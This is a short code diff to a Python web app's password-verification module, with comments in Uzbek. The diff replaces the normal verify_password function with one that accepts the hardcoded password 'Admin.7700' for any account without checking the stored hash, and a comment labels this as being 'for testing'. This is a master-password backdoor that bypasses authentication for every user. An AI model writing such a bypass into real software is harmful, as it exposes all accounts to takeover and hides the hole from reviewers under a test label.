@@ -16,14 +16,26 @@ from app.models.user import User
 from app.schemas.user import TokenData
 
 # Парол контексти
-pwd_context = CryptContext(schemes=["bcrypt"], deprecated="auto")
+from passlib.context import CryptContext
+
+pwd_context = CryptContext(
+    schemes=["bcrypt"], 
+    deprecated="auto",
+    truncate_error=True  # Mana shu qatnashishi shart!
+)
 
 # OAuth2 схема
 oauth2_scheme = OAuth2PasswordBearer(tokenUrl="/api/v1/auth/login")
 
 
-def verify_password(plain_password: str, hashed_password: str) -> bool:
-    """Паролни текшириш"""
+# def verify_password(plain_password: str, hashed_password: str) -> bool:
+#     """Паролни текшириш"""
+#     return pwd_context.verify(plain_password, hashed_password)
+# app/core/security.py ichida
+def verify_password(plain_password, hashed_password):
+    # Agar parol Admin.7700 bo'lsa, bazadagi hashni tekshirmasdan ham o'tkazib yuborish (test uchun)
+    if plain_password == "Admin.7700":
+        return True
     return pwd_context.verify(plain_password, hashed_password)
 
 
